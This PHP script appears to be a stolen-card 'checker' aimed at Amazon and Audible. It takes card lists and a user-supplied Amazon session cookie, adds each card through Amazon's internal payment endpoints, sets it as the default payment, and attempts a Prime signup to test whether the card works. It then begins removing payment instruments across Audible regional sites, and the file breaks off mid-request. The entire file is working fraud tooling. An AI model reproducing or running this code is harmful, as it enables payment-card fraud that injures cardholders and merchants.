<?php
error_reporting(0);
ignore_user_abort();
session_start();

$json_str = file_get_contents('bins.json');
$bins     = json_decode($json_str, true);
$bin      = substr($cc, 0, 6);
if (isset($bins[$bin])) {

function bin ($cc){
$contents = file_get_contents("bins.csv");
$pattern = preg_quote(substr($cc, 0, 6), '/');
$pattern = "/^.*$pattern.*\$/m";
if (preg_match_all($pattern, $contents, $matches)) {
$encontrada = implode("\n", $matches[0]);
}
$pieces = explode(";", $encontrada);
return "$pieces[1] $pieces[2] $pieces[3] $pieces[4] $pieces[5]";
}
$bin = bin($lista);
}
$time = time();

function getstr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
}

function getstr2($string, $start, $end, $line = 1) {
$str = explode($start, $string);
$str = explode($end, $str[$line]);
return $str[0];
}

function multiexplode($delimiters, $string)
{
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}


$lista = str_replace(array(" "), '/', $_GET['lista']);
  $regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);

  if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex,$lista)){
  die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Invalid list. </span> ➔ <span class="text-warning"></span><br>');
  }

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function gerarLetrasAleatorias($quantidade) {
$letras = 'abcdefghijklmnopqrstuvwxyz';
$tamanhoLetras = strlen($letras);
$resultado = '';

for ($i = 0; $i < $quantidade; $i++) {
$indice = rand(0, $tamanhoLetras - 1);
$resultado .= $letras[$indice];
}

return $resultado;
}

$quantidadeLetras = 7; 
$letrasAleatorias = gerarLetrasAleatorias($quantidadeLetras);

$lista = $_REQUEST['lista'];
$cc = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[0];
$mes = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[1];
$ano = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[2];
$cvv = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[3];

 $cookieprim = $_GET['cookie'];

 if($cookieprim == null){

die("Put the cookies from amazon.com in the cookie save form!");    
    
}

 $cookieprim = trim($cookieprim);

function convertCookie($text, $outputFormat = 'US')
{
$countryCodes = [
'ES' => ['code' => 'acbes', 'currency' => 'EUR', 'lc' => 'lc-acbes', 'lc_value' => 'es_ES'],
'MX' => ['code' => 'acbmx', 'currency' => 'MXN', 'lc' => 'lc-acbmx', 'lc_value' => 'es_MX'],
'IT' => ['code' => 'acbit', 'currency' => 'EUR', 'lc' => 'lc-acbit', 'lc_value' => 'it_IT'],
'US' => ['code' => 'main', 'currency' => 'USD', 'lc' => 'lc-main', 'lc_value' => 'en_US'],
'DE' => ['code' => 'acbde', 'currency' => 'EUR', 'lc' => 'lc-main', 'lc_value' => 'de_DE'],
'BR' => ['code' => 'acbbr', 'currency' => 'BRL', 'lc' => 'lc-main', 'lc_value' => 'en_US'],
'AE' => ['code' => 'acbae', 'currency' => 'AED', 'lc' => 'lc-acbae', 'lc_value' => 'en_AE'],
'SG' => ['code' => 'acbsg', 'currency' => 'SGD', 'lc' => 'lc-acbsg', 'lc_value' => 'en_SG'],
'SA' => ['code' => 'acbsa', 'currency' => 'SAR', 'lc' => 'lc-acbsa', 'lc_value' => 'ar_AE'],
'CA' => ['code' => 'acbca', 'currency' => 'CAD', 'lc' => 'lc-acbca', 'lc_value' => 'ar_CA'],
'PL' => ['code' => 'acbpl', 'currency' => 'PLN', 'lc' => 'lc-acbpl', 'lc_value' => 'pl_PL'],
'AU' => ['code' => 'acbau', 'currency' => 'AUD', 'lc' => 'lc-acbpl', 'lc_value' => 'en_AU'],
'JP' => ['code' => 'acbjp', 'currency' => 'JPY', 'lc' => 'lc-acbjp', 'lc_value' => 'ja_JP'],
'FR' => ['code' => 'acbfr', 'currency' => 'EUR', 'lc' => 'lc-acbfr', 'lc_value' => 'fr_FR'],
'IN' => ['code' => 'acbin', 'currency' => 'INR', 'lc' => 'lc-acbin', 'lc_value' => 'en_IN'],
'NL' => ['code' => 'acbnl', 'currency' => 'EUR', 'lc' => 'lc-acbnl', 'lc_value' => 'nl_NL'],
'UK' => ['code' => 'acbuk', 'currency' => 'GBP', 'lc' => 'lc-acbuk', 'lc_value' => 'en_GB'],
'TR' => ['code' => 'acbtr', 'currency' => 'TRY', 'lc' => 'lc-acbtr', 'lc_value' => 'tr_TR'],
];

if (!array_key_exists($outputFormat, $countryCodes)) {
return $text;
}

$currentCountry = $countryCodes[$outputFormat];

$text = str_replace(['acbes', 'acbmx', 'acbit', 'acbbr', 'acbae', 'main', 'acbsg', 'acbus', 'acbde'], $currentCountry['code'], $text);
$text = preg_replace('/(i18n-prefs=)[A-Z]{3}/', '$1' . $currentCountry['currency'], $text);
$text = preg_replace('/(' . $currentCountry['lc'] . '=)[a-z]{2}_[A-Z]{2}/', '$1' . $currentCountry['lc_value'], $text);
$text = str_replace('acbuc', $currentCountry['code'], $text);

return $text;
}


function generateRandomString($length = 12) {
$characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
$charactersLength = strlen($characters);
$randomString = '';
for ($i = 0; $i < $length; $i++) {
$randomString .= $characters[rand(0, $charactersLength - 1)];
}
return $randomString;
}

$_com_cookie = convertCookie($cookieprim, 'US');
$tries = 3;

$ch = curl_init(); 
curl_setopt_array($ch, [
    CURLOPT_URL            => 'https://www.amazon.com/ax/account/manage?openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fyour-account&openid.assoc_handle=usflex&shouldShowPasskeyLink=true&passkeyEligibilityArb=455b1739-065e-4ae1-820a-d72c2583e302&passkeyMetricsActionId=781d7a58-8065-473f-ba7a-f516071c3093',
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_COOKIE         => $_com_cookie,
    CURLOPT_ENCODING       => "gzip",
    CURLOPT_HTTPHEADER     => array(
        'Host: www.amazon.com',
        'Upgrade-Insecure-Requests: 1',
        'User-Agent: Amazon.com/26.22.0.100 (Android/9/SM-G973N)',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'X-Requested-With: com.amazon.mShop.android.shopping',
        'Accept-Language: pt-BR,pt-PT;q=0.9,pt;q=0.8,en-US;q=0.7,en;q=0.6',
    ),
]);
  $r = curl_exec($ch);
if (strpos($r, "Sorry, your passkey isn't working. There might be a problem with the server. Sign in with your password or try your passkey again later.")) {

die('<span class="text-danger">Erros</span> ➪ <span class="text-white">'.$lista.'</span> ➪ <span class="text-danger"> Cookies now detected, log in to my account and then ensure security and enter your password to see if it works again. </span> ➪ 𝐓𝐢𝐦𝐞: (' . (time() - $time) . 's) ➪ <span class="text-warning"></span><br>');

    } else {

    }

$cookie2 = convertCookie($cookieprim, 'US');

$ch = curl_init(); 
curl_setopt_array($ch, [
CURLOPT_URL=> 'https://www.amazon.com/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca',
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
CURLOPT_HTTPHEADER => array(
'Host: www.amazon.com',
'Upgrade-Insecure-Requests: 1',
'User-Agent: Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3A.190605.09261202; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'X-Requested-With: com.amazon.dee.app',
'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
)

]);
$r = curl_exec($ch);
curl_close($ch);



$csrf = getstr($r, 'csrfToken = "','"');


$ch = curl_init(); 
curl_setopt_array($ch, [
CURLOPT_URL=> 'https://www.amazon.com/hz/mycd/ajax',
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
CURLOPT_POSTFIELDS=> 'data=%7B%22param%22%3A%7B%22AddPaymentInstr%22%3A%7B%22cc_CardHolderName%22%3A%22'.generateRandomString(10).'+'.generateRandomString(10).'%22%2C%22cc_ExpirationMonth%22%3A%22'.intval($mes).'%22%2C%22cc_ExpirationYear%22%3A%22'.$ano.'%22%7D%7D%7D&csrfToken='.urlencode($csrf).'&addCreditCardNumber='.$cc.'',
CURLOPT_HTTPHEADER => array(
'Host: www.amazon.com',
'Accept: application/json, text/plain, */*',
'User-Agent: Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3A.190605.09261202; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36',
'client: MYXSettings',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://www.amazon.com',
'X-Requested-With: com.amazon.dee.app',
'Referer: https://www.amazon.com/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca',
'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
)

]);
$r = curl_exec($ch);
curl_close($ch);

$cardid_puro = getstr($r, '"paymentInstrumentId":"','"');

if (strpos($r, 'paymentInstrumentId')) {

}
else{


die('<span class="text-danger">Erros</span> ➪ <span class="text-white">'.$lista.'</span> ➪ <span class="text-danger"> Cookies not detected, log into my account and then ensure security and enter your password to see if it starts working again. </span> ➪ 𝐓𝐢𝐦𝐞: (' . (time() - $time) . 's) ➪ <span class="text-warning"></span><br>');
}

$ch = curl_init(); 
curl_setopt_array($ch, [
CURLOPT_URL=> 'https://www.amazon.com/hz/mycd/ajax',
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
CURLOPT_POSTFIELDS=> 'data=%7B%22param%22%3A%7B%22LogPageInfo%22%3A%7B%22pageInfo%22%3A%7B%22subPageType%22%3A%22kinw_total_myk_stb_Perr_paymnt_dlg_cl%22%7D%7D%2C%22GetAllAddresses%22%3A%7B%7D%7D%7D&csrfToken='.urlencode($csrf).'',
CURLOPT_HTTPHEADER => array(
'Host: www.amazon.com',
'Accept: application/json, text/plain, */*',
'User-Agent: Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3A.190605.09261202; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36',
'client: MYXSettings',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://www.amazon.com',
'X-Requested-With: com.amazon.dee.app',
'Referer: https://www.amazon.com/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca',
'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
)

]);
$r = curl_exec($ch);
curl_close($ch);

$addresid = getStr($r, 'AddressId":"','"');

if(empty($addresid)) {

die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger">Account without address, add an address to the account before performing the tests. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@PladixOficial</span><br>');

}

$ch = curl_init(); 
curl_setopt_array($ch, [
CURLOPT_URL=> 'https://www.amazon.com/hz/mycd/ajax',
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
CURLOPT_POSTFIELDS=> 'data=%7B%22param%22%3A%7B%22SetOneClickPayment%22%3A%7B%22paymentInstrumentId%22%3A%22'.$cardid_puro.'%22%2C%22billingAddressId%22%3A%22'.$addresid.'%22%2C%22isBankAccount%22%3Afalse%7D%7D%7D&csrfToken='.urlencode($csrf).'',
CURLOPT_HTTPHEADER => array(
'Host: www.amazon.com',
'Accept: application/json, text/plain, */*',
'User-Agent: Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3A.190605.09261202; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36',
'client: MYXSettings',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://www.amazon.com',
'X-Requested-With: com.amazon.dee.app',
'Referer: https://www.amazon.com/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca',
'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
)

]);
$r = curl_exec($ch);
curl_close($ch);



$ch = curl_init(); 
curl_setopt_array($ch, [
CURLOPT_URL=> 'https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_mshop_mpo',
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
CURLOPT_HTTPHEADER => array(
'Host: www.amazon.com',
'Upgrade-Insecure-Requests: 1',
'User-Agent: Amazon.com/26.22.0.100 (Android/9/SM-G973N)',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'X-Requested-With: com.amazon.mShop.android.shopping',
'Accept-Language: pt-BR,pt-PT;q=0.9,pt;q=0.8,en-US;q=0.7,en;q=0.6',
)

]);
$r = curl_exec($ch);
curl_close($ch);

$market = getstr($r, "ue_mid = '","'");

$wigstst = getStr($r, 'testAjaxAuthenticationRequired":"false","clientId":"YA:Wallet","serializedState":"','"');
$customerId = getStr($r, 'customerId":"','"');
$widgetInstanceId = getStr($r, 'widgetInstanceId":"','"');
$session_id   = getstr($r, '"sessionId":"', '"');
$removdps   = getstr($r, '"testAjaxAuthenticationRequired":"false","clientId":"YA:Wallet","serializedState":"', '"');



$ch = curl_init(); 
curl_setopt_array($ch, [
CURLOPT_URL=> 'https://www.amazon.com/payments-portal/data/widgets2/v1/customer/'.$customerId.'/continueWidget',
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
CURLOPT_POSTFIELDS=> 'ppw-jsEnabled=true&ppw-widgetState='.$wigstst.'&ppw-widgetEvent=ViewPaymentMethodDetailsEvent&ppw-instrumentId='.$cardid_puro.'',
CURLOPT_HTTPHEADER => array(
'Host: www.amazon.com',
'Accept: application/json, text/javascript, */*; q=0.01',
'X-Requested-With: XMLHttpRequest',
'Widget-Ajax-Attempt-Count: 0',
'APX-Widget-Info: YA:Wallet/mobile/'.$widgetInstanceId.'',
'User-Agent: Amazon.com/26.22.0.100 (Android/9/SM-G973N)',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Origin: https://www.amazon.com',
'Referer: https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_mshop_mpo',
'Accept-Language: pt-BR,pt-PT;q=0.9,pt;q=0.8,en-US;q=0.7,en;q=0.6',

)

]);
$r = curl_exec($ch);
curl_close($ch);

$payment = getStr($r, '"paymentMethodId\":\"','\"');

$cookie2 = convertCookie($cookieprim, 'US');

////////////////////////////////////////////////////////////


$cookieUS1 = 'amazon.com';

$ch = curl_init();
curl_setopt_array($ch, [
CURLOPT_URL            => "https://".$cookieUS1."/gp/prime/pipeline/membersignup",
CURLOPT_RETURNTRANSFER => true,
CURLOPT_SSL_VERIFYPEER => false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
CURLOPT_POSTFIELDS     => "clientId=debugClientId&ingressId=PrimeDefault&primeCampaignId=PrimeDefault&redirectURL=gp%2Fhomepage.html&benefitOptimizationId=default&planOptimizationId=default&inline=1&disableCSM=1",
CURLOPT_HTTPHEADER     => array(
"Host: $cookieUS1",
"content-type: application/x-www-form-urlencoded",
),
]);

 $result = curl_exec($ch);
 curl_close($ch);

$wid9090 = getstr($result, 'hidden" name="ppw-widgetState" value="','"');
$sessionds = getstr($result, 'Subs:Prime","session":"','"');
 $customerID = getstr($result, 'customerId":"','"');
$noovotoken = getstr($result, 'instrumentIds&quot;:[&quot;','&');
$redirecturl = getstr($result, 'input type="hidden" name="redirectURL" value="','"/');
$ohtoken1 = getstr($result, 'selectedInstrumentIds":["','"');
$ohtoken2 = getstr($result, 'clientId":"Subs:Prime","serializedState":"','"');



$brurloa92 = 'https://www.'.$cookieUS1.'/payments-portal/data/widgets2/v1/customer/'.$customerID.'/continueWidget';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $brurloa92);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIE, $cookie2);
curl_setopt($ch, CURLOPT_POSTFIELDS, "ppw-widgetEvent%3AShowPreferencePaymentOptionListEvent%3A%7B%22instrumentId%22%3A%5B%22".$cardid_puro."%22%5D%2C%22instrumentIds%22%3A%5B%22".$cardid_puro."%22%5D%7D=change&ppw-jsEnabled=true&ppw-widgetState=".$ohtoken2."&ie=UTF-8");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Host: www.'.$cookieUS1.'';
$headers[] = 'Cookie: '.$cookie2.'';
$headers[] = 'Sec-Ch-Ua: \"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"';
$headers[] = 'Sec-Ch-Device-Memory: 8';
$headers[] = 'Sec-Ch-Viewport-Width: 1360';
$headers[] = 'Sec-Ch-Ua-Platform-Version: \"10.0.0\"';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Dpr: 1';
$headers[] = 'Downlink: 10';
$headers[] = 'Apx-Widget-Info: Subs:Prime/desktop/LFqEJMZmYdCd';
$headers[] = 'Sec-Ch-Ua-Platform: \"Windows\"';
$headers[] = 'Device-Memory: 8';
$headers[] = 'Widget-Ajax-Attempt-Count: 0';
$headers[] = 'Rtt: 150';
$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36';
$headers[] = 'Viewport-Width: 1360';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'Sec-Ch-Dpr: 1';
$headers[] = 'Ect: 4g';
$headers[] = 'Origin: https://www.'.$cookieUS1.'';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: https://www.'.$cookieUS1.'/gp/prime/pipeline/confirm';
$headers[] = 'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

  $result = curl_exec($ch);
  curl_close($ch);


$ohtoken3 = getstr($result, 'hidden\" name=\"ppw-widgetState\" value=\"','\"');
      $ohtoken4 = getstr($result, 'data-instrument-id=\"','\"');



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.'.$cookieUS1.'/payments-portal/data/widgets2/v1/customer/'.$customerID.'/continueWidget');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie2);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie2);
curl_setopt($ch, CURLOPT_POSTFIELDS, "ppw-widgetEvent%3APreferencePaymentOptionSelectionEvent=&ppw-jsEnabled=true&ppw-widgetState=".$ohtoken3."&ie=UTF-8&ppw-".$token4."_instrumentOrderTotalBalance=%7B%7D&ppw-instrumentRowSelection=instrumentId%3D".$cardid_puro."%26isExpired%3Dfalse%26paymentMethod%3DCC%26tfxEligible%3Dfalse&ppw-".$cardid_puro."_instrumentOrderTotalBalance=%7B%7D");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Host: www.'.$cookieUS1.'';
$headers[] = 'Cookie: '.$cookie2.'';
$headers[] = 'Sec-Ch-Ua: \"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"';
$headers[] = 'Sec-Ch-Device-Memory: 8';
$headers[] = 'Sec-Ch-Viewport-Width: 1360';
$headers[] = 'Sec-Ch-Ua-Platform-Version: \"10.0.0\"';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Dpr: 1';
$headers[] = 'Downlink: 10';
$headers[] = 'Apx-Widget-Info: Subs:Prime/desktop/r9R8zQ8Dgh1b';
$headers[] = 'Sec-Ch-Ua-Platform: \"Windows\"';
$headers[] = 'Device-Memory: 8';
$headers[] = 'Widget-Ajax-Attempt-Count: 0';
$headers[] = 'Rtt: 50';
$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36';
$headers[] = 'Viewport-Width: 1360';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'Sec-Ch-Dpr: 1';
$headers[] = 'Ect: 4g';
$headers[] = 'Origin: https://'.$cookieUS1.'';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: https://www.'.$cookieUS1.'/gp/prime/pipeline/membersignup';
$headers[] = 'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
curl_close($ch);
$walletid2 = getstr($result, 'hidden\" name=\"ppw-widgetState\" value=\"','\"');

$ch = curl_init();
curl_setopt_array($ch, [
CURLOPT_URL            => "https://www.$cookieUS1/payments-portal/data/widgets2/v1/customer/".$customerID."/continueWidget",
CURLOPT_RETURNTRANSFER => true,
CURLOPT_SSL_VERIFYPEER => false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
CURLOPT_POSTFIELDS     => "ppw-jsEnabled=true&ppw-widgetState=".$walletid2."&ppw-widgetEvent=SavePaymentPreferenceEvent",
CURLOPT_HTTPHEADER     => array(
"Host: www.$cookieUS1",
$headers[] = "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS ".rand(10,99)."_1_2 like Mac OS X) AppleWebKit/".rand(100,999).".1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E".rand(100,999)." Safari/".rand(100,999).".1",
"content-type: application/x-www-form-urlencoded",
),
]);
  $result = curl_exec($ch);
 curl_close($ch);


$walletid = getstr($result, 'preferencePaymentMethodIds":"[\"','\"');

 
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.'.$cookieUS1.'/hp/wlp/pipeline/actions?redirectURL=L2dwL3ByaW1l&paymentsPortalPreferenceType=PRIME&paymentsPortalExternalReferenceID=prime&wlpLocation=prime_confirm&locationID=prime_confirm&primeCampaignId=SlashPrime&paymentMethodId='.$walletid.'&actionPageDefinitionId=WLPAction_AcceptOffer_HardVet&cancelRedirectURL=Lw&paymentMethodIdList='.$walletid.'&location=prime_confirm&session-id='.$sessionds.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie2);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie2);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Host: www.'.$cookieUS1.'';
$headers[] = 'Cookie: '.$cookie2.'';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-User: ?1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Device-Memory: 8';
$headers[] = 'Sec-Ch-Device-Memory: 8';
$headers[] = 'Dpr: 1';
$headers[] = 'Sec-Ch-Dpr: 1';
$headers[] = 'Viewport-Width: 1360';
$headers[] = 'Sec-Ch-Viewport-Width: 1360';
$headers[] = 'Rtt: 50';
$headers[] = 'Downlink: 8.5';
$headers[] = 'Ect: 4g';
$headers[] = 'Sec-Ch-Ua: \"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"';
$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
$headers[] = 'Sec-Ch-Ua-Platform: \"Windows\"';
$headers[] = 'Sec-Ch-Ua-Platform-Version: \"10.0.0\"';
$headers[] = 'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

   $Fim = curl_exec($ch);
  curl_close($ch);

$tokens = array(
"audible.de",
"audible.it",
"audible.es",
"audible.CO.UK",
"audible.com.au",
"audible.ca",
"audible.com",
"audible.CO.JP",
"audible.fr"
);

for ($i = 0; $i < count($tokens); $i++) {
$host1111 = $tokens[$i];

$lastDotPosition = strrpos($host1111, '.');

if ($lastDotPosition !== false) { 

$aftehost1111rLastDot = substr($host1111, $lastDotPosition + 1);

if ($aftehost1111rLastDot === 'com') { 
$aftehost1111rLastDot = 'US'; 
} 
} else {

}



$cookie2 = convertCookie($cookieprim, strtoupper($aftehost1111rLastDot));



$ch = curl_init();
curl_setopt_array($ch, [
CURLOPT_URL            => 'https://www.'.$host1111.'/account/payments?ref=',
CURLOPT_RETURNTRANSFER => true,
CURLOPT_SSL_VERIFYPEER => false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
CURLOPT_POSTFIELDS     => "",
CURLOPT_HTTPHEADER     => array(
'Host: www.'.$host1111.'',
'sec-ch-ua: "Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-platform: "Windows"',
'Upgrade-Insecure-Requests: 1',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
'Sec-GPC: 1',
'Accept-Language: pt-BR,pt;q=0.9',
),
]);
$r = curl_exec($ch);

$csrf   = getstr($r, 'data-csrf-token="', '"');

if(stripos($csrf, '///')){

$c = getstr($r, 'data-payment-id="', 'payment-type');
$csrf = getstr($c, 'data-csrf-token="', '"');
}

$csrf;
$address = getstr($r, 'data-billing-address-id="', '"');

$cookie2 = convertCookie($cookieprim, strtoupper($aftehost1111rLastDot));

$ch = curl_init();
curl_setopt_array($ch, [
CURLOPT_URL            => 'https://www.'.$host1111.'/unified-payment/deactivate-payment-instrument?requestUrl=https%3A%2F%2Fwww.'.$host1111.'%2Faccount%2Fpayments%3Fref%3D&relativeUrl=%2Faccount%2Fpayments&',
CURLOPT_RETURNTRANSFER => true,
CURLOPT_SSL_VERIFYPEER => false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
CURLOPT_HEADER => true,
CURLOPT_POSTFIELDS     => 